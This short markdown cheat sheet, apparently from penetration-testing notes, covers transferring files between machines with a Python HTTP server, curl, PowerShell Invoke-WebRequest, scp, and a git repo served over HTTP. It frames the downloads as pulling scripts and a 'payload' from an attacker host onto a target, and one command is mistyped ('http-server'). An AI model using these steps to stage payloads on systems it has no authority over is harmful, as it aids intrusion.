## Simple HTTP server
Serve file locally:
- `python3 -m http-server`
Retrieve file on remote host:
- Linux: `curl http://$lhost:8000/file.sh > file.sh`
- WIndows: `iwr -URI http://$lhost:8000/file.ps1 -UseBasicParsing -OutFile file.ps1`
## SCP
- `scp user@host1.local:/file/to/send user@host2.local:/where/to/place`
## Git
Set up git repo locally:
- `git init`
- `git add . && git commit -m "commit 1"`
- `cd .git && git --bare update-server-info && cd ..`
- `python3 -m http.server`
Retrieve Payload:
- `git clone http://127.0.0.1:8000/.git/`
